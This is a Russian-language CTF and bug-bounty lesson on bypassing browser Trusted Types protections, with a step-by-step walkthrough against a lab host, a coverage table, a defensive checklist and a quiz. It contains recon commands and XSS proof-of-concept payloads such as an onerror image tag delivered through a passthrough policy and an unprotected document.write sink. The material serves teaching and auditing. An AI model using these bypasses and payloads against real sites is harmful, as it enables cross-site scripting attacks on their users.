---
id: web-trusted-types-bypass
title: "Trusted Types и обход клиентских защит"
category: web
parent: web-csp-advanced
difficulty: hard
order: 1
tags: [trusted-types, csp, xss, dom, bypass]
prerequisites: [web-csp-advanced, web-xss]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
estimated_minutes: 45
summary: "Что такое Trusted Types, как они блокируют DOM-XSS и где остаются дыры: некорректные политики, default policy, DOM clobbering."
---

## Задача

На `https://target.local` кроме строгого CSP включены **Trusted Types** — защита, которая ломает обычный DOM-XSS. Мы нашли отражение ввода, но браузер бросает `TypeError`, когда код пытается присвоить нашу строку в `innerHTML`.

Trusted Types превращает DOM-XSS из «случайной» уязвимости в ошибку компиляции. Но, как и любая защита, он имеет **крайние случаи**, которые оставляют sink'и открытыми — именно их и ищет тестировщик.

## Данные, с которыми работаем

```
Content-Security-Policy: require-trusted-types-for 'script'; trusted-types default
```

И JS-бандл `app.js`, который нам предстоит разобрать.

## Что такое Trusted Types

Политика задаётся заголовком и создаётся в JS:

```js
const p = trustedTypes.createPolicy('default', {
  createHTML: (s) => s,                       // без санитизации — опасно!
  createScript: (s) => s,
  createScriptURL: (s) => s,
});
```

Когда политика активна, браузер требует, чтобы в `innerHTML`, `eval`, `script.src` попадал не `string`, а результат `p.createHTML(...)` (объект `TrustedHTML`):

```js
el.innerHTML = userInput;               // TypeError: requires TrustedHTML
el.innerHTML = p.createHTML(userInput); // ок — но только если политика безопасна
```

Ключевое: **Trusted Types защищает не сам ввод, а канал доставки в sink**. Если политика реализована как тождественная функция, защита превращается в формальность.

## Почему политики ломаются

1. **`default`-политика без санитизации** — `createHTML: (s) => s` пропускает любую строку.
2. **Passthrough-политика** — код создаёт `createPolicy('x', {createHTML: s => s})` и использует её.
3. **Дыры в покрытии** — не все sink'и покрыты (`document.write`, `srcdoc`, `javascript:` — частично).

## Шаг 1: проверить заголовок и активность

```bash
$ curl -sI https://target.local/ | grep -i 'content-security-policy'
content-security-policy: require-trusted-types-for 'script'; trusted-types default
```

**Условие ветвления:** заголовка нет → это обычный DOM-XSS. Есть, но `trusted-types *` → ограничение имён отключено, любая библиотека создаст «дырявую» политику. Есть `trusted-types default` → проверяем само тело политики.

## Шаг 2: найти политики в бандлах

```bash
$ katana -u https://target.local -jc -silent | grep -oE 'https?://[^"]+\.js' | sort -u > js.txt
$ for u in $(cat js.txt); do curl -s "$u"; done | grep -oE "createPolicy\(['\"][a-zA-Z0-9_-]+['\"]"
createPolicy("default", {...})
createPolicy("dompurify", {...})
```

Мы видим две политики: приложения (`default`) и библиотеки (`dompurify`).

## Шаг 3: оценить тело политики

```bash
$ curl -s https://target.local/app.js | grep -oE 'createPolicy\([^;]+'
createPolicy('default', { createHTML: s => DOMPurify.sanitize(s) })
```

Политика `default` **санитизирует** через DOMPurify — DOM-XSS через `innerHTML` закрыт. Но вторая политика выглядит иначе:

```bash
$ curl -s https://target.local/dompurify.js | grep -A3 'createPolicy("dompurify"'
createPolicy("dompurify", { createHTML: s => s })   # passthrough -> дыра!
```

`createHTML: s => s` — тождественная функция. Любой код (в том числе внедрённый другим вектором) может ей воспользоваться:

```html
<script>
const p = trustedTypes.createPolicy('dompurify', {createHTML: s => s});
document.getElementById('x').innerHTML = p.createHTML('<img src=x onerror=alert(1)>');
</script>
```

## Шаг 4: непокрытые sink'и

Trusted Types блокирует присваивания строк в sink'и, но не устраняет сам источник. Ищем sink'и вне покрытия:

```bash
$ curl -s https://target.local/app.js | grep -oE '(eval|setTimeout|document\.write|srcdoc)'
document.write(location.search)         # непокрытый sink!
```

Проверяем его напрямую:

```bash
$ curl -s 'https://target.local/?q=<img src=x onerror=alert(1)>' | grep -o '<img src=x onerror=alert(1)>'
```

Если `document.write` вставил payload в DOM — XSS подтверждён, несмотря на включённые Trusted Types.

| Sink | Покрыт TT? | Обход |
|------|:----------:|-------|
| `innerHTML` | да | passthrough-политика |
| `outerHTML`/`insertAdjacentHTML` | да | passthrough-политика |
| `document.write` | частично | прямой вызов |
| `eval`/`Function` | да | `createScript` passthrough |
| `script.src` | да | `createScriptURL` без allowlist |
| `iframe.srcdoc` | частично | прямой `srcdoc` |
| `javascript:` URL | частично | навигация |
| серверный HTML | нет | reflected/stored XSS |

## Шаг 5: DOM clobbering

Если приложение читает «доверенную» ссылку из DOM, clobbering подменяет её именованным элементом:

```html
<form id="trustedTypes"><input name="createPolicy"></form>
```

Практически это редко, но при аудите всегда проверяй, не читает ли код «доверенные» ссылки из DOM. В сочетании с `iframe` и `name` clobbering обходит проверки, которые кажутся надёжными.

## Шаг 6: сторонние библиотеки

Библиотеки, добавляющие совместимость с Trusted Types, сами создают политики. Если библиотека создаёт passthrough-политику, она открывает дыру во всём приложении:

```bash
$ for u in $(cat js.txt); do curl -s "$u"; done | grep -oE "createPolicy\(['\"][a-zA-Z0-9_-]+['\"]"
createPolicy("default", {...})
createPolicy("dompurify", {...})      # createHTML: s => s -> дыра
```

## Полный прогон от начала до конца

1. Заголовок: `require-trusted-types-for 'script'; trusted-types default` — TT активны.
2. `createPolicy('default', DOMPurify.sanitize)` — основная политика безопасна.
3. `createPolicy('dompurify', s => s)` — passthrough → используем её.
4. `document.write(location.search)` — непокрытый sink.
5. `?q=<img src=x onerror=alert(1)>` → payload в DOM → XSS подтверждён.

## Чек-лист и крайние случаи

- Заголовок `require-trusted-types-for 'script'` присутствует?
- `trusted-types` ограничивает имена (не `*`)?
- Политика `default` действительно санитизирует (DOMPurify)?
- Нет passthrough-политик (`createHTML: s => s`)?
- Проверены `eval`, `setTimeout`, `document.write`, `srcdoc`, `javascript:`?
- Серверные отражения HTML проверены отдельно (TT их не закрывает)?
- Сторонние библиотеки не создают «дырявых» политик?

Крайние случаи: `trusted-types *` (любые имена), report-only (не блокирует), политика создаётся позже первого sink'а, Service Worker подменяет ответ и ослабляет заголовки, `createScriptURL` без allowlist.

## Если не сработало — пробуй это

- **Политика санитизирует.** Ищи непокрытый sink или passthrough у другой библиотеки.
- **`trusted-types` строгий.** Ищи, создаёт ли код политику под разрешённым именем.
- **Всё покрыто.** Переходи к серверным отражениям HTML — TT их не закрывает.
- **Report-only.** Заголовок ничего не блокирует — XSS не ограничен.
- **Service Worker.** Проверь, не ослабляет ли он заголовки.

## Что мы теперь знаем

- Trusted Types защищает **канал** в sink, а не ввод.
- Passthrough-политика (`s => s`) сводит защиту на нет.
- Покрытие sink'ов неполное: `document.write`, `srcdoc`, `javascript:`.
- Сторонние библиотеки создают политики — часть поверхности атаки.
- Серверные reflected/stored XSS Trusted Types не закрывает.

## На что смотреть дальше

- **`trusted-types *`.** Разрешает любые имена политик, включая созданные атакующим.
- **Report-only.** Не блокирует, только логирует.
- **`createScriptURL` без allowlist.** Открывает загрузку скриптов с любого URL.
- **DOM clobbering.** Подменяет значение переменной, а не строку в sink.
- **Комбинируй с CSP.** TT — дополнение к CSP, а не замена.

## Квиз

Проверь себя.

```quiz
- question: "Что делает require-trusted-types-for 'script'?"
  options:
    - "Заставляет использовать Trusted Types вместо строк в опасных sink'ах"
    - "Шифрует cookies"
    - "Включает CORS"
    - "Отключает HTTPS"
  answer: 0
  explanation: "Присваивание сырой строки в innerHTML/eval бросает ошибку."
- question: "Где чаще всего дыра в Trusted Types?"
  options:
    - "В слабой или passthrough default policy"
    - "В порту сервера"
    - "В DNS"
    - "В cookie"
  answer: 0
  explanation: "createHTML: s => s сводит защиту на нет."
- question: "Что такое createScriptURL?"
  options:
    - "Метод политики, возвращающий TrustedScriptURL для script.src"
    - "SQL-функция"
    - "CSS-правило"
    - "DNS-запись"
  answer: 0
  explanation: "Без валидации он позволяет загрузить внешний скрипт."
- question: "Почему DOM clobbering обходит Trusted Types?"
  options:
    - "TT защищает от строк в sink, но не от подмены данных, читаемых доверенным кодом"
    - "Он отключает CSP"
    - "Он меняет политику"
    - "Он шифрует HTML"
  answer: 0
  explanation: "Clobbering подменяет значение переменной, а не строку в sink."
- question: "Как быстро проверить, активны ли TT?"
  options:
    - "Попробовать document.body.innerHTML='<img src=x>' и поймать ошибку"
    - "Сменить User-Agent"
    - "Открыть порт"
    - "Сменить DNS"
  answer: 0
  explanation: "При активных TT присваивание строки бросит TypeError."
```

## Куда дальше

Дальше (`web-mxss`) мы разберём mutation XSS — обход санитайзеров, в том числе тех, что используются внутри политик Trusted Types. А пока главное запомни: заголовок TT — не гарантия; проверяй тело каждой политики и покрытие sink'ов.

## Где пригодится

- **CTF (Web):** задачи с «современной» защитой, где нужно найти слабую политику.
- **Bug bounty:** обход TT — редкий, но ценный баг в крупных приложениях.
- **Пентест:** аудит CSP + политик Trusted Types.
- **Работа (AppSec/Dev):** правильная политика (санитизация внутри `createHTML`, валидация URL).
